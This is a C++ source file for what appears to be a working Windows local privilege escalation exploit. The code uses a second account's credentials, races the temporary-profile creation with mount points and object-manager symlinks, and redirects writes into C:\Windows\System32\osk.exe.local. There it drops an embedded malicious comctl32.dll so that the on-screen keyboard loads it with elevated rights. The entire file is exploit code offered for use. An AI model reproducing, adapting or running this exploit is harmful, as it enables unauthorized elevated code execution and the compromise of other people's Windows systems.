#include <iostream>
#include <ShlObj.h>
#include <sddl.h>
#include <stdio.h>
#include <UserEnv.h>
#include "Win-Ops-Master.h"
#include "resource.h"
#pragma comment(lib, "UserEnv.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "shell32.lib")
using namespace std;
OpsMaster op;

HANDLE h = NULL;
HANDLE htoken = NULL;
HANDLE ht = NULL;
wstring passw;
wstring userw;
WCHAR dest[256];

DWORD WINAPI createproc(void* argv) {
	_PROCESS_INFORMATION inf = { 0 };
	if (!CreateProcessWithLogonW(userw.c_str(), NULL, passw.c_str(),
		LOGON_WITH_PROFILE
		, L"C:\\Windows\\notepad.exe", NULL, CREATE_NEW_CONSOLE | CREATE_SUSPENDED, NULL,
		NULL, NULL, &inf)) {
		ExitProcess(1);
	}
	CloseHandle(inf.hThread);
	TerminateProcess(inf.hProcess, ERROR_SUCCESS);
	CloseHandle(inf.hProcess);
	
}
void RemoveDirNotParent(wstring dir) {
	std::wstring search_path = std::wstring(dir) + L"\\*.*";
	std::wstring s_p = std::wstring(dir) + std::wstring(L"\\");
	WIN32_FIND_DATA fd;
	HANDLE hFind = FindFirstFile(search_path.c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0)
				{
					op.RRemoveDirectory(s_p + fd.cFileName);
				}
			}
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
				_wrmdir(std::wstring(s_p + fd.cFileName).c_str());
			}
			else {
				DeleteFile((s_p + fd.cFileName).c_str());
			}
		} while (FindNextFile(hFind, &fd));
		FindClose(hFind);
	}
}
void cb() {
	ImpersonateLoggedOnUser(htoken);
	op.MoveFileToTempDir(h, USE_SYSTEM_TEMP_DIR);
	RemoveDirNotParent(L"C:\\Users\\TEMP\\AppData\\Local\\Microsoft");
	ht = op.OpenDirectory(L"C:\\Users\\TEMP\\AppData\\Local\\Microsoft", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE);
	op.CreateMountPoint(ht, L"\\RPC CONTROL\\");
	op.CreateNativeSymlink(L"\\RPC CONTROL\\Windows", L"\\??\\C:\\Users\\Default\\AppData\\Local\\Microsoft\\Windows");
	op.CreateNativeSymlink(L"\\RPC CONTROL\\Temporary Internet Files", L"\\??\\C:\\Windows\\System32\\osk.exe.local");
	op.CreateNativeSymlink(L"\\BaseNamedObjects\\Restricted\\Windows", L"\\BaseNamedObjects\\Restricted");
	op.CreateNativeSymlink(L"\\BaseNamedObjects\\Restricted\\Temporary Internet Files", L"\\??\\C:\\Windows\\System32\\osk.exe.local");
}

void DoDropPayload() {
	HMODULE hm = GetModuleHandle(NULL);
	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_DLL1), L"dll");
	DWORD DllSize = SizeofResource(hm, res);
	void* DllBuff = LoadResource(hm, res);
	WIN32_FIND_DATA data = { 0 };
	HANDLE hfind = FindFirstFile(L"C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_*_none_*", &data);
	wstring wermgr_dir = L"C:\\Windows\\System32\\osk.exe.local\\";
	wstring _dll_dir = wermgr_dir + data.cFileName;
	CreateDirectory(_dll_dir.c_str(), NULL);
	wstring _dll = _dll_dir + L"\\comctl32.dll";
	HANDLE hdll = op.OpenFileNative(_dll, GENERIC_WRITE, ALL_SHARING, CREATE_ALWAYS);
	op.WriteFileNative(hdll, DllBuff, DllSize);
	CloseHandle(hdll);
	while (FindNextFileW(hfind, &data) == TRUE) {

		_dll_dir = wermgr_dir + data.cFileName;
		CreateDirectory(_dll_dir.c_str(), NULL);
		_dll = _dll_dir + L"\\comctl32.dll";
		hdll = op.OpenFileNative(_dll, GENERIC_WRITE, ALL_SHARING, CREATE_ALWAYS);
		op.WriteFileNative(hdll, DllBuff, DllSize);
		CloseHandle(hdll);
	}
	return;
}

int main(int argc, char* argv[]) {
	if (argc != 3) {
		printf("[*] Usage: %s [username] [password]\n[*] Note: The credential shoud be different from the current user", argv[0]);
		return 0;
	}
	CreateDirectoryA("C:\\_tmp_", 0);
	if (!op.MoveFileToTempDir("C:\\_tmp_", true, USE_SYSTEM_TEMP_DIR)) {
		return 1;
	}
	if (!LogonUserA(argv[1], NULL, argv[2], LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &htoken)) {
		return 1;
	}
	//SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
	Wow64EnableWow64FsRedirection(FALSE);
	ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\osk.exe", NULL, NULL, SW_HIDE);
	ExpandEnvironmentStringsForUserW(htoken, L"%USERDOMAIN%\\%USERNAME%", dest, 256);
	string usera = argv[1];
	string passa = argv[2];
	userw = wstring(usera.begin(), usera.end());
	passw = wstring(passa.begin(), passa.end());
	_PROCESS_INFORMATION inf = {};
	if (!CreateProcessWithLogonW(userw.c_str(), NULL, passw.c_str(),
		LOGON_WITH_PROFILE
		, L"C:\\Windows\\notepad.exe", NULL, CREATE_NEW_CONSOLE | CREATE_SUSPENDED, NULL,
		NULL, NULL, &inf)) {
		return 1;
	}
	if (!TerminateProcess(inf.hProcess, ERROR_SUCCESS)) {
		return 1;
	}
	if (!ImpersonateLoggedOnUser(htoken)) {
		return 1;

	}
	WCHAR userprofile[MAX_PATH];
	ExpandEnvironmentStringsForUserW(htoken, L"%USERNAME%", userprofile, MAX_PATH);
	wstring ntuser = L"C:\\Users\\" + wstring(userprofile) + wstring(L"\\ntuser.dat");
	HANDLE hdat;
	do {
		hdat = CreateFile(ntuser.c_str(), GENERIC_READ, NULL,
			NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	} while (hdat == INVALID_HANDLE_VALUE);
	DWORD tpid = 0;
	HANDLE hthread = CreateThread(NULL, NULL, createproc, NULL, NULL, &tpid);
	while (GetFileAttributesW(L"C:\\Users\\Temp") == INVALID_FILE_ATTRIBUTES) {}
	HANDLE lock = op.OpenFileNative("C:\\Users\\TEMP\\.lock", GENERIC_READ, CREATE_ALWAYS);
	//op.MoveFileToTempDir("C:\\_tmp_", true, USE_SYSTEM_TEMP_DIR);
	CreateDirectoryA("C:\\_tmp_", 0);
	do {
		h = op.OpenDirectory(L"C:\\Users\\TEMP\\AppData\\Local\\Microsoft\\Windows",
			GENERIC_READ|GENERIC_WRITE, ALL_SHARING, OPEN_ALWAYS);
	} while (!h);
	op.CreateMountPoint(h, L"C:\\_tmp_");
	CloseHandle(h);
	h = NULL;
	do {
		h = op.OpenDirectory("C:\\Users\\TEMP\\Documents", GENERIC_READ | GENERIC_WRITE, ALL_SHARING, OPEN_EXISTING);
		if (h) {
			op.CreateMountPoint(h, L"\\BaseNamedObjects\\Restricted");
			CloseHandle(h);
			op.CreateNativeSymlink("\\BaseNamedObjects\\Restricted\\My Music", "\\??\\C:\\Windows\\System32\\osk.exe.local");
			break;
		}
	} while (1);
	HANDLE hfind = NULL;
	WIN32_FIND_DATA data = { 0 };
	do {
		FindClose(hfind);
		hfind = FindFirstFile(L"C:\\_tmp_\\*TMContainer00000000000000000002.regtrans-ms", &data);
	} while (hfind == INVALID_HANDLE_VALUE);
	FindClose(hfind);
	op.DeleteMountPoint(L"C:\\Users\\TEMP\\AppData\\Local\\Microsoft\\Windows");
	h = op.OpenFileNative(L"C:\\Users\\TEMP\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat");
	CloseHandle(h);
	h = NULL;
	do {
		h = op.OpenDirectory(L"C:\\Users\\TEMP\\AppData\\Local\\Temporary Internet Files",
			GENERIC_READ, ALL_SHARING, OPEN_EXISTING);
	} while (!h);
	CloseHandle(h);
	
	h = op.OpenDirectory(L"C:\\Users\\TEMP\\AppData\\Local\\Microsoft\\Windows", GENERIC_READ | DELETE,
		ALL_SHARING, OPEN_ALWAYS);

	op.CreateAndWaitLock(h, cb);
	op.DeleteMountPoint(ht);
	
	op.CreateMountPoint(ht, L"\\BaseNamedObjects\\Restricted");
	CloseHandle(h);
	CloseHandle(ht);
	Sleep(5000);
	WaitForSingleObject(hthread, INFINITE);
	CloseHandle(hthread);
	CloseHandle(lock);
	SHCreateDirectory(NULL, L"C:\\Users\\TEMP\\AppData\\Local\\Microsoft\\Windows\\INetCache");
	DoDropPayload();
	RevertToSelf();
	ShellExecute(NULL, L"runas", L"C:\\Windows\\notepad.exe", NULL, NULL, SW_SHOW);
	ImpersonateLoggedOnUser(htoken);
	op.RRemoveDirectory("c:\\users\\temp");
	op.RRemoveDirectory("c:\\_tmp_");
	CloseHandle(htoken);
	return 0;
}